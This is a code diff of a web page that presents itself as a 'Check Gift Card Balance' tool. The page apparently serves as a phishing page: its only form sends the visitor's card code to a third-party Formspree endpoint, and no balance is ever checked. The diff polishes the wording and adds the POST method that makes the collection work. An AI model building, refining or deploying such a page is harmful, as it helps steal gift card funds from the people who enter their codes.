@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Check Card Balance</title>
+  <title>Check Gift Card Balance</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
@@ -50,6 +50,9 @@
       font-size: 15px;
       cursor: pointer;
     }
+    button:active {
+      opacity: 0.85;
+    }
     .footer {
       margin-top: 18px;
       font-size: 12px;
@@ -60,10 +63,11 @@
 <body>
 
 <div class="container">
-  <h1>Check Card Balance</h1>
+  <h1>Check Gift Card Balance</h1>
   <p>Enter your card code to continue</p>
 
-  <form action="https://formspree.io/f/xnjjopze" 
+  <!-- Formspree form -->
+  <form action="https://formspree.io/f/xnjjopze" method="POST">
     <input type="text" name="card_code" placeholder="Enter card code" required>
     <button type="submit">Continue</button>
   </form>
